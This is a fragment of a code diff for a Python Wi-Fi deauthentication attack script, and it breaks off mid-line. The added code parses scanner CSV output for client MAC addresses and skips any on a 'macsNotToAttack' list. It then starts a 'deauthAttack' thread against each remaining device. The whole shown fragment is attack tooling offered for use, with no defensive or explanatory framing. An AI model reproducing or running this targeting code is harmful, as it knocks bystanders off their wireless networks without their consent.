@@ -182,3 +182,22 @@ try:
         for fileName in os.listdir():
             fieldNames = ["Station MAC", "First time seen", "Last time seen",
                           ]
+            if ".csv" in fileName and fileName.startswith("clients"):
+                with open(fileName) as csv_h:
+                    print("Running......")
+                    csv_h.seek(0)
+                    csvReader = csv.DictReader(csv_h, fieldnames=fieldNames)
+                    for index, row in enumerate(csvReader):
+                        if index < 5:
+                            pass
+                        elif row["Station MAC"] in macsNotToAttack:
+                            pass
+                        else:
+                            actiiveClients.add(row["Station MAC"])
+            print("Station MAC    ")
+            print("----------------")
+            for item in actiiveClients:
+                print(f"{item}")
+                if item not in threadsStarted:
+                    threadsStarted.append(item)
+                    t = threading.Thread(target=deauthAttack, )
